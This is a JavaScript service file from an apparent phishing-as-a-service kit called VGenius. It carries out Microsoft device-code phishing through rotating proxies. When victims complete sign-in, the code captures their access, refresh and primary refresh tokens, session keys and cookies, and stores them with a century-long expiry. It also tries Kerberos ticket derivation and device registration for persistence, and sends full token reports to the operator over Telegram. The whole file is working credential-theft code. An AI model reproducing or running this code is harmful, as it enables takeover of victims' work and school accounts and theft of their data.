/**
 * VGenius C Engine – Device Proxy Service
 * Handles Microsoft Device Code OAuth flow proxying
 */
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const jwt = require('jsonwebtoken');
const db = require('../database/connection');
const config = require('../config/env');
const { encrypt, decrypt } = require('../utils/encrypt');
const { sendTelegramDocument } = require('../services/notification');
const proxyManager = require('../services/proxymanager');

// In-memory job store (for active device code flows)
const activeJobs = new Map();

/**
 * Start a new device code flow
 * @param {string} mode - "token" or "cookie"
 * @param {string} jwtToken - The link's JWT token (user_id, link_id)
 * @param {object} reqOptions - Optional: { ip, userAgent } for capturing visitor info
 * @returns {object} job data including user_code, verification_uri, etc.
 */
async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
  try {
    // Decode JWT to get user_id and link_id
    const decoded = jwt.verify(jwtToken, config.JWT_SECRET);
    const { user_id, link_id } = decoded;

    // Verify user and link are active
    const [users] = await db.query(
      "SELECT * FROM users WHERE id = ? AND subscription_status = 'active' AND (subscription_expiry IS NULL OR subscription_expiry > NOW())",
      [user_id]
    );
    if (!users.length) throw new Error('Subscription inactive');
    const user = users[0];

    const [links] = await db.query(
      'SELECT * FROM links WHERE id = ? AND user_id = ? AND status = ? AND kill_switched = 0',
      [link_id, user_id, 'active']
    );
    if (!links.length) throw new Error('Link not active');
    const link = links[0];

    // Call Microsoft Device Code endpoint via proxy
    const tenant = config.AZURE_TENANT || 'common';
    const clientId = config.AZURE_CLIENT_ID;

    // Get a random active proxy
    const proxy = await proxyManager.getRandomProxy();
    let proxyConfig = {};
    let proxyId = null;

    if (proxy) {
      proxyId = proxy.id;
      const proxyConfigData = proxyManager.getAxiosProxyConfig(proxy);
      proxyConfig = proxyConfigData || {};

      // Use HttpsProxyAgent for proxy support
      if (proxy.proxy_username && proxy.proxy_password) {
        const proxyUrl = `${proxy.proxy_type || 'http'}://${proxy.proxy_username}:${proxy.proxy_password}@${proxy.proxy_host}:${proxy.proxy_port}`;
        const agent = new HttpsProxyAgent(proxyUrl);
        proxyConfig.httpsAgent = agent;
      } else {
        const proxyUrl = `${proxy.proxy_type || 'http'}://${proxy.proxy_host}:${proxy.proxy_port}`;
        const agent = new HttpsProxyAgent(proxyUrl);
        proxyConfig.httpsAgent = agent;
      }

      console.log(`[DeviceProxy] Using proxy ${proxy.proxy_host}:${proxy.proxy_port} (ID: ${proxyId})`);
    }

    const dcResponse = await axios.post(
      `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
      new URLSearchParams({
        client_id: clientId,
        scope: 'openid profile offline_access https://api.office.net/ests/device/management/adrs_access',
      }),
      {
        ...proxyConfig,
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        timeout: 15000
      }
    );

    const dcData = dcResponse.data;
    const jobId = `job_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;

    // Store job in memory with IP/user-agent for later token capture
    activeJobs.set(jobId, {
      jobId,
      user_id,
      link_id,
      device_code: dcData.device_code,
      interval: dcData.interval || 5,
      expires_in: dcData.expires_in || 900,
      expires_at: Date.now() + (dcData.expires_in || 900) * 1000,
      mode: mode || 'cookie',
      status: 'polling',
      created_at: Date.now(),
      jwtToken,
      ip_address: (reqOptions && reqOptions.ip) || 'unknown',
      user_agent: (reqOptions && reqOptions.userAgent) || 'DeviceProxy',
      proxy_id: proxyId,
      proxy_host: proxy ? proxy.proxy_host : null,
    });

    // Start polling in background
    pollForToken(jobId);

    return {
      job_id: jobId,
      user_code: dcData.user_code,
      verification_uri: dcData.verification_uri,
      verification_uri_complete: dcData.verification_uri_complete || `${dcData.verification_uri}?code=${dcData.user_code}`,
      expires_in: dcData.expires_in,
      interval: dcData.interval || 5,
      message: dcData.message,
    };
  } catch (err) {
    console.error('[DeviceProxy] startDeviceFlow error:', err.message);
    if (err.response) {
      console.error('[DeviceProxy] Microsoft response:', err.response.status, JSON.stringify(err.response.data).substring(0, 500));
    }
    throw err;
  }
}

/**
 * Poll for token completion
 */
async function pollForToken(jobId) {
  const job = activeJobs.get(jobId);
  if (!job) return;

  const tenant = config.AZURE_TENANT || 'common';
  const clientId = config.AZURE_CLIENT_ID;
  const maxAttempts = Math.ceil((job.expires_in || 900) / (job.interval || 5));

  for (let i = 0; i < maxAttempts; i++) {
    if (!activeJobs.has(jobId)) return; // Job cancelled

    // Check if expired before polling
    if (Date.now() > job.expires_at) {
      job.status = 'expired';
      // Update visitor status to timeout
      try {
        await db.query(
          'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
          ['timeout', job.user_id, job.link_id, 'waiting']
        );
      } catch (e) {
        /* ignore */
      }
      return;
    }

    await new Promise(resolve => setTimeout(resolve, (job.interval || 5) * 1000));

    try {
      // Build proxy config for polling (use same proxy as device code request)
      let pollProxyConfig = {};
      if (job.proxy_id) {
        const pollProxy = await proxyManager.getRandomProxy();
        if (pollProxy && pollProxy.id === job.proxy_id) {
          const proxyConfigData = proxyManager.getAxiosProxyConfig(pollProxy);
          if (proxyConfigData) {
            if (pollProxy.proxy_username && pollProxy.proxy_password) {
              const proxyUrl = `${pollProxy.proxy_type || 'http'}://${pollProxy.proxy_username}:${pollProxy.proxy_password}@${pollProxy.proxy_host}:${pollProxy.proxy_port}`;
              const agent = new HttpsProxyAgent(proxyUrl);
              pollProxyConfig.httpsAgent = agent;
            } else {
              const proxyUrl = `${pollProxy.proxy_type || 'http'}://${pollProxy.proxy_host}:${pollProxy.proxy_port}`;
              const agent = new HttpsProxyAgent(proxyUrl);
              pollProxyConfig.httpsAgent = agent;
            }
          }
        }
      }

      const tokenResponse = await axios.post(
        `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
        new URLSearchParams({
          grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
          client_id: clientId,
          device_code: job.device_code,
        }),
        {
          ...pollProxyConfig,
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          validateStatus: () => true,
          timeout: 15000
        }
      );

      const tokenData = tokenResponse.data;

      if (tokenData.access_token) {
        // SUCCESS! Store token
        job.status = 'completed';

        // Extract email FIRST before using it
        let capturedEmail = null;
        if (tokenData.id_token) {
          try {
            const payload = JSON.parse(Buffer.from(tokenData.id_token.split('.')[1], 'base64').toString());
            capturedEmail = payload.email || payload.upn || payload.preferred_username || null;
          } catch (e) {
            /* ignore */
          }
        }

        // Capture Set-Cookie headers from the token response (session cookies)
        const responseCookies = [];
        const setCookieHeaders = tokenResponse.headers['set-cookie'] || [];
        for (const cookieStr of setCookieHeaders) {
          const cookieParts = cookieStr.split(';')[0].trim();
          const eqIndex = cookieParts.indexOf('=');
          if (eqIndex > 0) {
            const cookieName = cookieParts.substring(0, eqIndex).trim();
            const cookieValue = cookieParts.substring(eqIndex + 1).trim();
            if (cookieName && cookieValue) {
              responseCookies.push({
                name: cookieName,
                value: cookieValue,
                domain: '.login.microsoftonline.com'
              });
            }
          }
        }

        // Store cookies and email in job for later storage
        job.captured_cookies = responseCookies;
        job.captured_email = capturedEmail;
        await storeToken(job, tokenData, responseCookies);

        // Mark proxy as success
        if (job.proxy_id) {
          try {
            await proxyManager.markSuccess(job.proxy_id);
            console.log(`[DeviceProxy] Marked proxy ${job.proxy_id} as success`);
          } catch (e) {
            /* ignore */
          }
        }

        // Mark visitors as done for this user/link
        try {
          await db.query(
            'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
            ['done', job.user_id, job.link_id, 'waiting']
          );
        } catch (e) {
          /* silent */
        }
        return;
      }

      // Check for AADSTS50076 / soft error
      const errorCode = tokenData.error || '';
      const errorDesc = tokenData.error_description || '';

      if (errorCode === 'authorization_pending') continue;

      if (errorCode === 'slow_down') {
        // Increase interval
        job.interval = (job.interval || 5) + 5;
        continue;
      }

      // Personal account errors - stop immediately with "code expired" behavior
      if (
        errorCode === 'expired_token' ||
        errorCode === 'authorization_declined' ||
        errorDesc.includes('AADSTS50079') ||  // MSA account requires interaction
        errorDesc.includes('personal account') ||
        errorDesc.includes('MSA') ||
        (errorCode === 'invalid_grant' && (
          errorDesc.includes('expired') ||
          errorDesc.includes('personal') ||
          errorDesc.includes('MSA')
        ))
      ) {
        // Personal account or declined - stop immediately
        // This matches competitor behavior showing "code expired"
        console.log('[DeviceProxy] Personal account detected, stopping with expired behavior');
        job.status = 'failed';
        job.error = 'Code expired';
        return;
      }

      // AADSTS50076 or interaction_required -> soft error
      if (
        errorDesc.includes('aadsts50076') ||
        errorDesc.includes('interaction_required') ||
        errorCode === 'authorization_declined'
      ) {
        job.status = 'soft_error';
        // Start a new device code flow in token mode and store it
        const newJob = await retryAsTokenMode(job);
        if (newJob) {
          job.retry_job_id = newJob.jobId;
        }
        return;
      }
    } catch (err) {
      console.error('[DeviceProxy] Poll error:', err.message);
      // Mark proxy as failure
      if (job.proxy_id) {
        try {
          await proxyManager.markFailure(job.proxy_id);
          console.log(`[DeviceProxy] Marked proxy ${job.proxy_id} as failure`);
        } catch (e) {
          /* ignore */
        }
      }
      // Continue polling on network errors
    }
  }

  // Exhausted attempts - mark as expired with visitor timeout
  job.status = 'expired';
  try {
    await db.query(
      'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
      ['timeout', job.user_id, job.link_id, 'waiting']
    );
  } catch (e) {
    /* ignore */
  }
}

/**
 * Retry as token mode (create new device code)
 */
async function retryAsTokenMode(originalJob) {
  try {
    const tenant = config.AZURE_TENANT || 'common';
    const clientId = config.AZURE_CLIENT_ID;

    // Get a random active proxy for retry
    const proxy = await proxyManager.getRandomProxy();
    let retryProxyConfig = {};
    let retryProxyId = null;

    if (proxy) {
      retryProxyId = proxy.id;
      if (proxy.proxy_username && proxy.proxy_password) {
        const proxyUrl = `${proxy.proxy_type || 'http'}://${proxy.proxy_username}:${proxy.proxy_password}@${proxy.proxy_host}:${proxy.proxy_port}`;
        const agent = new HttpsProxyAgent(proxyUrl);
        retryProxyConfig.httpsAgent = agent;
      } else {
        const proxyUrl = `${proxy.proxy_type || 'http'}://${proxy.proxy_host}:${proxy.proxy_port}`;
        const agent = new HttpsProxyAgent(proxyUrl);
        retryProxyConfig.httpsAgent = agent;
      }
      console.log(`[DeviceProxy] Retry using proxy ${proxy.proxy_host}:${proxy.proxy_port} (ID: ${retryProxyId})`);
    }

    const dcResponse = await axios.post(
      `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
      new URLSearchParams({
        client_id: clientId,
        scope: 'openid profile email offline_access https://api.office.net/ests/device/management/adrs_access',
      }),
      {
        ...retryProxyConfig,
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        timeout: 15000
      }
    );

    const dcData = dcResponse.data;
    const newJobId = `job_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;

    const newJob = {
      jobId: newJobId,
      user_id: originalJob.user_id,
      link_id: originalJob.link_id,
      device_code: dcData.device_code,
      interval: dcData.interval || 5,
      expires_in: dcData.expires_in || 900,
      expires_at: Date.now() + (dcData.expires_in || 900) * 1000,
      mode: 'token',
      status: 'polling',
      created_at: Date.now(),
      jwtToken: originalJob.jwtToken,
      is_retry: true,
      proxy_id: retryProxyId,
      proxy_host: proxy ? proxy.proxy_host : null,
    };

    activeJobs.set(newJobId, newJob);
    pollForToken(newJobId);

    return {
      jobId: newJobId,
      user_code: dcData.user_code,
      verification_uri: dcData.verification_uri,
      verification_uri_complete: dcData.verification_uri_complete || `${dcData.verification_uri}?code=${dcData.user_code}`,
      expires_in: dcData.expires_in,
      interval: dcData.interval || 5,
    };
  } catch (err) {
    console.error('[DeviceProxy] retryAsTokenMode error:', err.message);
    return null;
  }
}

/**
 * Store captured token in database
 */
async function storeToken(job, tokenData, responseCookies = []) {
  try {
    // Extract email and tenant from id_token
    let email = null;
    let idTokenTenant = null;
    if (tokenData.id_token) {
      try {
        const payload = JSON.parse(Buffer.from(tokenData.id_token.split('.')[1], 'base64').toString());
        email = payload.email || payload.upn || payload.preferred_username || null;
        idTokenTenant = payload.tid || null; // Extract actual tenant ID from token
      } catch (e) {
        /* ignore */
      }
    }

    // Use stored IP and user-agent from when the flow started
    const ipAddress = job.ip_address || 'unknown';
    const userAgent = job.user_agent || 'DeviceProxy';

    // Format cookies for storage
    let cookiesEncrypted = null;
    if (responseCookies && responseCookies.length > 0) {
      const cookieStrings = responseCookies.map(
        c => `${c.name}=${c.value}; domain=${c.domain}; path=/; secure`
      ).join('; ');
      cookiesEncrypted = encrypt(cookieStrings);
    }

    // Determine tenant - prefer id_token tenant, fallback to link's jwt_payload
    let tenant = idTokenTenant || 'common';
    if (!idTokenTenant && job.jwtToken) {
      try {
        const decoded = jwt.verify(job.jwtToken, config.JWT_SECRET);
        const [links] = await db.query('SELECT jwt_payload FROM links WHERE id = ? AND user_id = ?', [decoded.link_id, decoded.user_id]);
        if (links.length && links[0].jwt_payload) {
          const parsed = JSON.parse(links[0].jwt_payload);
          if (parsed.tenant) tenant = parsed.tenant;
        }
      } catch (e) { /* use default */ }
    }

    // Extract PRT and related fields from token response
    let prt = null;
    let sessionKeyJwe = null;
    let deviceTenantId = null;

    // For device code flow, refresh_token is the PRT for work/school accounts
    if (tokenData.refresh_token) {
      prt = tokenData.refresh_token;
    }

    // Extract session_key_enc from token response (if present)
    if (tokenData.session_key_enc) {
      sessionKeyJwe = tokenData.session_key_enc;
    }

    // Extract device_tenant_id from client_info
    if (tokenData.client_info) {
      try {
        const clientInfo = JSON.parse(Buffer.from(tokenData.client_info, 'base64').toString());
        deviceTenantId = clientInfo.utid || null;
      } catch (e) { /* ignore */ }
    }

    // Determine account type from email domain (must be before INSERT)
    // Default to work/school - only personal accounts (outlook/hotmail/live/passport) are excluded
    let accountType = 'work_school';
    if (email) {
      const emailDomain = email.split('@')[1].toLowerCase();
      if (['outlook.com', 'hotmail.com', 'live.com', 'passport.com'].includes(emailDomain)) {
        accountType = 'personal';
        console.log('[DeviceProxy] Personal account detected:', emailDomain, '- device registration disabled');
      } else {
        console.log('[DeviceProxy] Organization account detected:', emailDomain, '- device registration enabled');
      }
    }

    // Determine client_id used for this capture
    const clientIdUsed = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';

    const [result] = await db.query(
       `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, prt, session_key_jwe, device_tenant_id, cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type, account_type, client_id)
        VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?, ?)`,
      [
        job.user_id,
        job.link_id,
        email,
        encrypt(tokenData.access_token),
        encrypt(tokenData.refresh_token || null),
        encrypt(tokenData.id_token || null),
        encrypt(prt),
        encrypt(sessionKeyJwe),
        deviceTenantId,
        cookiesEncrypted,
        ipAddress,
        userAgent,
        tenant,
        'office',
        accountType,
        clientIdUsed,
      ]
    );

    const tokenId = result.insertId;

    // Log token capture details for debugging
    console.log('[DeviceProxy] Token captured:', {
      tokenId,
      email,
      accountType,
      tenant,
      hasPrt: !!prt,
      hasIdToken: !!tokenData.id_token,
      idTokenTenant: idTokenTenant || 'not extracted'
    });

    // Auto-derive Kerberos TGTs for work/school accounts with PRT
    // This runs asynchronously and doesn't block the response
    // Requires: PRT + work/school account + specific tenant ID (not 'common' or 'organizations')
    if (prt && accountType === 'work_school' && tenant && tenant !== 'common' && tenant !== 'organizations') {
      console.log('[DeviceProxy] Attempting Kerberos TGT derivation for token', tokenId, 'tenant:', tenant);
      const kerberosService = require('./kerberos');
      kerberosService.deriveTGTForToken(tokenId)
        .then(derivationResult => {
          if (derivationResult.success) {
            console.log('[DeviceProxy] Kerberos TGT derived for token', tokenId, ':', derivationResult.email);
            // Update the token record with Kerberos data
            if (derivationResult.tgt_cloud) {
              db.query(
                'UPDATE captured_tokens SET tgt_cloud = ? WHERE id = ?',
                [encrypt(derivationResult.tgt_cloud), tokenId]
              ).catch(err => console.error('[DeviceProxy] Failed to save TGT cloud:', err));
            }
            if (derivationResult.tgt_ad) {
              db.query(
                'UPDATE captured_tokens SET tgt_ad = ? WHERE id = ?',
                [encrypt(derivationResult.tgt_ad), tokenId]
              ).catch(err => console.error('[DeviceProxy] Failed to save TGT AD:', err));
            }
            if (derivationResult.session_key) {
              db.query(
                'UPDATE captured_tokens SET tgt_cloud_sessionkey = ? WHERE id = ?',
                [encrypt(derivationResult.session_key), tokenId]
              ).catch(err => console.error('[DeviceProxy] Failed to save session key:', err));
            }
            if (derivationResult.kerberos_top_level_names) {
              db.query(
                'UPDATE captured_tokens SET kerberos_top_level_names = ? WHERE id = ?',
                [derivationResult.kerberos_top_level_names, tokenId]
              ).catch(err => console.error('[DeviceProxy] Failed to save kerberos names:', err));
            }
          } else {
            console.log('[DeviceProxy] Kerberos derivation skipped for token', tokenId, ':', derivationResult.error || 'no PRT');
          }
        })
        .catch(err => {
          console.error('[DeviceProxy] Kerberos derivation error:', err.message);
        });
    } else {
      console.log('[DeviceProxy] Kerberos derivation skipped:', {
        tokenId,
        reason: !prt ? 'no PRT' : accountType !== 'work_school' ? 'not work/school' : tenant === 'common' || tenant === 'organizations' ? 'tenant too generic (' + tenant + ')' : 'unknown'
      });
    }

    // Attempt device registration and PRT generation for work/school accounts
    // This runs asynchronously and doesn't block the response
    // Works for: specific tenant GUIDs AND 'organizations' endpoint
    if (accountType === 'work_school' && tokenData.access_token && tenant && tenant !== 'common') {
      console.log('[DeviceProxy] Attempting device registration for token', tokenId, 'tenant:', tenant);
      const deviceManager = require('./devicemanager');
      deviceManager.registerDeviceAndGetPrt({
        access_token: tokenData.access_token,
        refresh_token: tokenData.refresh_token,
        tenant_id: tenant,
        user_id: job.user_id,
        link_id: job.link_id
      }).then(registrationResult => {
        console.log('[DeviceProxy] Device registered successfully:', registrationResult.deviceId);
        // Store device credentials in database
        return deviceManager.storeDeviceCredentials(registrationResult, job.user_id, email);
      }).then(() => {
        console.log('[DeviceProxy] Device credentials stored for token', tokenId);
      }).catch(err => {
        console.error('[DeviceProxy] Device registration failed:', err.message);
        // Don't fail the token capture - device registration is optional
      });
    } else {
      console.log('[DeviceProxy] Device registration skipped:', {
        tokenId,
        reason: accountType !== 'work_school' ? 'not work/school' : !tokenData.access_token ? 'no access_token' : tenant === 'common' ? 'tenant too generic (common)' : 'unknown'
      });
    }

    // Update visitor status to "done" (or "blocked" if block_done_visitors is enabled)
    try {
      const [blockRows] = await db.query(
        'SELECT block_done_visitors FROM visitor_settings WHERE user_id = ?',
        [job.user_id]
      );
      const blockDone = blockRows.length > 0 && blockRows[0].block_done_visitors == 1;
      const newStatus = blockDone ? 'blocked' : 'done';
      
      // Update ALL visitors with status 'waiting' OR 'visited' for this user/link
      // This ensures visitors logged by block-check (status='visited') are also updated
      const [updateResult] = await db.query(
        'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status IN (?, ?)',
        [newStatus, job.user_id, job.link_id, 'waiting', 'visited']
      );
      console.log(`[DeviceProxy] Visitor marked as ${newStatus} for user ${job.user_id}, link ${job.link_id} (updated ${updateResult.affectedRows} rows)`);
    } catch (updateErr) {
      console.error('[DeviceProxy] Visitor status update error:', updateErr.message);
    }

    // Notify via WebSocket
    try {
      const io = require('express')().get('io');
      if (io) {
        io.to(`user_${job.user_id}`).emit('new_token', {
          id: tokenId,
          email,
          token_type: 'token',
          created_at: new Date(),
        });
      }
    } catch (e) {
      /* silent */
    }

    // Timestamp for notification
    const stamp = new Date().toISOString().replace('T', ' ').slice(0, 19);

    const templateType = 'office';

    // Build caption summary (HTML, <=1024 chars)
    const AMP = String.fromCharCode(38) + 'amp;';
    const LT = String.fromCharCode(38) + 'lt;';
    const GT = String.fromCharCode(38) + 'gt;';
    const esc = (val) => {
      if (val === null || val === undefined) return 'N/A';
      const s = typeof val === 'string' ? val : JSON.stringify(val);
      return s.replace(/&/g, AMP).replace(/</g, LT).replace(/>/g, GT);
    };

    const captionLines = [
`🚨 <b>NEW CAPTURE - TOKEN</b>`,
      `👤 <b>Email:</b> ${esc(email || 'unknown')}`,
      `🏷️ <b>Account:</b> ${esc(accountType)} | <b>Tenant:</b> ${esc(tenant)}`,
      `🌐 <b>Template:</b> ${esc(templateType)}`,
      `🌍 <b>IP:</b> ${esc(ipAddress || '0.0.0.0')}`,
      `🔗 <b>Link:</b> ${esc(job.link_id)}       | <b>Token ID:</b> ${esc(tokenId)}`,
`📅 <b>Time:</b> ${esc(stamp)}`,
      `✅ Full tokens in attached .txt`,
    ];
    const caption = captionLines.join('\n');

    // Build full file content
    const fileParts = [
      'VGENIUS CAPTURE REPORT',
      '========================================',
      `Type:        TOKEN`,
      `Token ID:    ${tokenId}`,
      `Link ID:     ${job.link_id}`,
      `Email:       ${email || 'unknown'}`,
      `Account:     ${accountType}`,
      `Tenant:      ${tenant}`,
      `Template:    ${templateType}`,
      `IP:          ${ipAddress || '0.0.0.0'}`,
      `User-Agent:  ${userAgent || 'DeviceProxy'}`,
      `Captured:    ${stamp}`,
      '========================================',
      '',
      'ACCESS TOKEN:',
      tokenData.access_token || 'N/A',
      '',
    ];

    if (tokenData.refresh_token) {
      fileParts.push('REFRESH TOKEN:');
      fileParts.push(tokenData.refresh_token);
      fileParts.push('');
    }

    if (tokenData.id_token) {
      fileParts.push('ID TOKEN:');
      fileParts.push(tokenData.id_token);
      fileParts.push('');
    }

    // PRT persistence fields (captured from full token response)
    if (tokenData.client_info) {
      fileParts.push('CLIENT INFO:');
      fileParts.push(tokenData.client_info);
      fileParts.push('');
    }

    if (tokenData.session_key) {
      fileParts.push('SESSION KEY:');
      fileParts.push(tokenData.session_key);
      fileParts.push('');
    }

    if (tokenData.session_key_enc) {
      fileParts.push('SESSION KEY ENC:');
      fileParts.push(tokenData.session_key_enc);
      fileParts.push('');
    }

    if (tokenData.token_type) {
      fileParts.push('TOKEN TYPE:');
      fileParts.push(tokenData.token_type);
      fileParts.push('');
    }

    if (tokenData.expires_in) {
      fileParts.push('EXPIRES IN:');
      fileParts.push(tokenData.expires_in);
      fileParts.push('');
    }

    if (tokenData.foci) {
      fileParts.push('FCOI:');
      fileParts.push(tokenData.foci);
      fileParts.push('');
    }

    if (tokenData.refresh_in_on_revocation) {
      fileParts.push('REFRESH IN ON REVOCATION:');
      fileParts.push(tokenData.refresh_in_on_revocation);
      fileParts.push('');
    }

    if (responseCookies && responseCookies.length > 0) {
      fileParts.push('========================================');
      fileParts.push(`COOKIES (${responseCookies.length} cookies):`);
      fileParts.push(responseCookies.map(c => `${c.name}=${c.value}; domain=${c.domain}`).join('; '));
      fileParts.push('');
    }

    fileParts.push('========================================');
    fileParts.push('END OF REPORT');
    const fileContent = fileParts.join('\n');
    const filename = `capture_device_${tokenId}_token.txt`;

    // Send the full report as a Telegram document
    await sendTelegramDocument(job.user_id, filename, fileContent, caption);

    console.log(`[DeviceProxy] Token captured for user ${job.user_id}, link ${job.link_id}`);
  } catch (err) {
    console.error('[DeviceProxy] storeToken error:', err.message);
  }
}

/**
 * Poll a specific job status
 * @param {string} jobId
 * @returns {object} status info
 */
function getJobStatus(jobId) {
  const job = activeJobs.get(jobId);
  if (!job) {
    return {
      status: 'not_found',
      error: 'Job not found or expired'
    };
  }

  // Check expiry
  if (Date.now() > job.expires_at && job.status === 'polling') {
    job.status = 'expired';
  }

  const remaining = Math.max(0, Math.floor((job.expires_at - Date.now()) / 1000));

  const result = {
    status: job.status === 'completed' ? 'done' : job.status,
    job_id: job.jobId,
    user_code: null,
    verification_uri: null,
    verification_uri_complete: null,
    expires_in: remaining,
    recommended_mode: null,
    error_code: null,
    error_message: null,
  };

  if (job.status === 'polling') {
    // Return waiting status
    result.status = 'waiting_user';
  }

  if (job.status === 'expired' || job.status === 'failed') {
    result.error = job.error || 'Code expired or verification failed';
  }

  if (job.status === 'soft_error') {
    result.soft_error = true;
    result.error_code = 50076;
    result.recommended_mode = 'token';
    result.error_message = 'Additional verification required';
    if (job.retry_job_id) {
      result.retry_job_id = job.retry_job_id;
    }
  }

  if (job.status === 'completed') {
    result.email = job.captured_email || null;
  }

  return result;
}

/**
 * Clean up expired jobs (called periodically)
 */
function cleanupJobs() {
  const now = Date.now();
  for (const [id, job] of activeJobs) {
    if (now > job.expires_at + 300000) {
      // 5 min grace period
      activeJobs.delete(id);
    }
  }
}

// Cleanup every 5 minutes
setInterval(cleanupJobs, 5 * 60 * 1000);

module.exports = {
  startDeviceFlow,
  getJobStatus,
  pollForToken,
  cleanupJobs,
};
